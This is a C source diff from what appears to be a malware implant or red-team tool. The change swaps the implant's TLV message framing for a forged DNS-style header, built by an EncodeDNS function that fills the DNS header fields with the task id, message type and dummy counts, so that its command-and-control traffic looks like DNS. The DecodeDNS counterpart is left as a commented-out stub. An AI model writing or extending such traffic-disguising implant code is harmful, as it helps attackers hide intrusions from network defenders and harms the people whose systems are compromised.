@@ -74,17 +74,15 @@ static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
 	return TRUE;
 }
 
-BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload)
+BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength, CONST PBYTE payload)
 {
-	PBYTE msg = ImplantHeapAlloc(TLV_HEADER_SIZE + payloadLength);
+	PBYTE msg = ImplantHeapAlloc(DNS_HEADER_SIZE + payloadLength);
 
 	ASSERT(sock != INVALID_SOCKET);
 
-	memcpy(msg + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
-	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
-	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);
+	EncodeDNS(msg, taskId, type, &payloadLength, payload);
 
-	if (!SendAll(sock, (CONST CHAR*)msg, TLV_HEADER_SIZE + payloadLength))
+	if (!SendAll(sock, (CONST CHAR*)msg, payloadLength))
 	{
 		ImplantHeapFree(msg);
 		return FALSE;
@@ -155,3 +153,31 @@ VOID FreeTlvMessage(TLV_MESSAGE* msg)
 		msg->value = NULL;
 	}
 }
+
+BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD* payloadLength, CONST PBYTE payload)
+{
+	USHORT length, dummyAnswer, dummyAuthority, dummyAdditional;
+	dummyAnswer = 0;
+	dummyAuthority = 0;
+	dummyAdditional = 0;
+	length = (USHORT)*payloadLength;
+
+	//memcpy(dest, src, size);
+	memcpy(msg, &taskId, sizeof(USHORT));
+	memcpy(msg + DNS_FLAGS_OFFSET, (USHORT*)&type, sizeof(USHORT));
+	memcpy(msg + DNS_LENGTH_OFFSET, &length, sizeof(USHORT));
+	memcpy(msg + DNS_ANSWER_OFFSET, &dummyAnswer, sizeof(USHORT));
+	memcpy(msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
+	memcpy(msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));
+
+	memcpy(msg + DNS_HEADER_SIZE, payload, *payloadLength);
+
+	*payloadLength = (DWORD)(length + DNS_HEADER_SIZE);
+
+	return TRUE;
+}
+
+/*BOOL DecodeDNS(PBYTE msg, DWORD type, DWORD payloadLength, CONST PBYTE payload)
+{
+
+}*/
